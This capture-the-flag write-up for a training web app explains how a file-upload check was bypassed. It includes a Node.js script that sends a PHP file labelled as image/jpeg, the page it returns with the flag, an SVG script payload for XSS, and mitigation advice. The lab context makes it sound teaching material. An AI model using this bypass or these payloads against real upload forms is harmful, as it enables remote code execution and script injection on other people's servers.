# File upload breach send script as image with fake content/type

## How we found the breach

Source: https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-content-type-and-magic-number

On the page `http://IP/?page=upload`, we can find a image upload form. After trying uploading different type of files, we assume that the server only accepts `jpg` format files. We also know that the form uses `multipart/form-data`.

### Bypassing the filename parser

We tried to trick the server verification by passing junk data in the filename such as:

- script.jpg.php
- file.png.jpg.php
- ...

The server continues rejecting our upload attempts.

### Mocking the file content-type

After submitting the file upload form without selecting any file we can find the request using the devtools, then we can copy it as a call to `fetch`:

```js
fetch("http://IP/?page=upload", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryXayOWrhdk6J4aXb0",
    "upgrade-insecure-requests": "1",
    "cookie": "I_am_admin=68934a3e9455fa72420237eb05902327",
    "Referer": "http://IP/?page=upload",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryXayOWrhdk6J4aXb0--\r\n",
  "method": "POST"
});
```

The sent body expanded is as follows:

```txt
------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="uploaded"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryXayOWrhdk6J4aXb0
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryXayOWrhdk6J4aXb0--
```

Either from the HTML form fields or from the request body, we can find the `form-data` entries:

- `uploaded` (contains the file)
- `MAX_FILE_SIZE` (the maximum size of the file; not safe neither, as can be changed)
- `Upload` (the value of the submit button)

The next step is to manually create the same `form-data` with a custom `content-type` equal to `image/jpeg` but in reality would contain an evil script.

### The whole script

```js
import FormData from 'form-data';

const form = new FormData();

form.append('uploaded', await fs.readFile('./script.php'), {
   contentType: 'image/jpeg',
   filename: "script.php"
});
form.append('MAX_FILE_SIZE', 10_000);
form.append('Upload', "Upload");

const response = await fetch("http://192.168.56.101/?page=upload", {
   "headers": {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "max-age=0",
      ...form.getHeaders(),
      "upgrade-insecure-requests": "1",
      "cookie": "I_am_admin=68934a3e9455fa72420237eb05902327",
      "Referer": "http://192.168.56.101/?page=upload",
      "Referrer-Policy": "strict-origin-when-cross-origin"
   },
   "body": form,
   "method": "POST"
});

console.log(await response.text());
```

Run the script using (do not forget to install dependencies before):
```bash
node script.js
```

After running this Node.js script we're able to retrieve the flag in the rendered page:

```html  
<!DOCTYPE HTML>
<html>
   <head>
      <title>BornToSec - Web Section</title>
      <meta http-equiv="content-type" content="text/html; charset=utf-8" />
      <meta name="description" content="" />
      <meta name="keywords" content="" />
      <!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
      <script src="js/jquery.min.js"></script>
      <script src="js/skel.min.js"></script>
      <script src="js/skel-layers.min.js"></script>
      <script src="js/init.js"></script>
      <noscript>
         <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/x-icon" href="favicon.ico" />
         <link rel="stylesheet" href="css/skel.css" />
         <link rel="stylesheet" href="css/style.css" />
         <link rel="stylesheet" href="css/style-xlarge.css" />
      </noscript>
   </head>
   <body class="landing">
      <!-- Header -->
      <header id="header" >
         <a href=http://192.168.56.101><img src=http://192.168.56.101/images/42.jpeg height=82px width=82px/></a>
         <nav id="nav">
            <ul>
               <li><a href="index.php">Home</a></li>
               <li><a href="?page=survey">Survey</a></li>
               <li><a href="?page=member">Members</a></li>
            </ul>
         </nav>
      </header>
      <!-- Main -->
      <section id="main" class="wrapper">
         <div class="container" style="margin-top:75px">
            <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre>
            <pre>/tmp/coco.php successfully uploaded.</pre>
            <table width=50%>
               <tr style="background-color:transparent;border:none;">
                  <td colspan=2>
                     <h2 align=center>File upload:</h2>
                  </td>
               </tr>
               <tr style="background-color:transparent;border:none;">
                  <td align=center style="vertical-align:middle;">
                     <img src="images/upload.png" width=150px/>
                  </td>
                  <td>
                     <form enctype="multipart/form-data" action="#" method="POST">
                        <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
                        Choose an image to upload:
                        <br />
                        <input name="uploaded" type="file" /><br />
                        <br />
                        <input type="submit" name="Upload" value="Upload">
                     </form>
                  </td>
               </tr>
            </table>
         </div>
      </section>
      <!-- Footer -->
      <footer id="footer">
         <div class="container">
            <ul class="icons">
               <li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
               <li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
               <li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
            </ul>
            <ul class="copyright">
               <a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
                  <li>&copy; BornToSec</li>
               </a>
            </ul>
         </div>
      </footer>
   </body>
</html>
```

## How to exploit the breach

Being able to upload a script to a server can enable several attacks, on the client, and on the server.

### Remote Code Execution

If we uploaded `script.php` as an image, which is then stored in the filesystem of the server, and made available publicly, we can execute code on the server.

If we make a request to `<ip>/images/script.php`, the server (Apache for example) may want to interpret the script file before returning it as is. We would be able to execute any PHP code on the server, and then execute any command, to remove files, or open an SSH connection.

If other users make this request, we may get access to their cookies.

### XSS

If we uploaded a SVG image and it was not sanitized, we may be able to execute JavaScript code.

SVG images can contain `<script />` tags:

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```

Source: https://blog.yeswehack.com/yeswerhackers/file-upload-attacks-part-2/

### Uploading very large files

By uploading a very large file we may make the server crash and cause a denial of service.

## How to avoid the breach

The server should never trust data sent by clients, as they can be completely customized by anyone.

There's a lot of native solutions to securely verify the true content type of an input file, such as [imagetype](https://www.php.net/manual/fr/function.exif-imagetype.php) or [finfo](https://www.php.net/manual/fr/function.finfo-file.php). The content type received from the client should never be trust.

The type of files should be strictly restricted. If a file does not have an authorized type, it should be rejected.

Uploaded files should never be able to get executed. They should only be served statically.

If SVG images or HTML pages are allowed, they should be carefully sanitized to prevent cross-side scripting attacks.

The name of the file sent in the request should be discarded, and instead a random and unique name should be generated server-side.
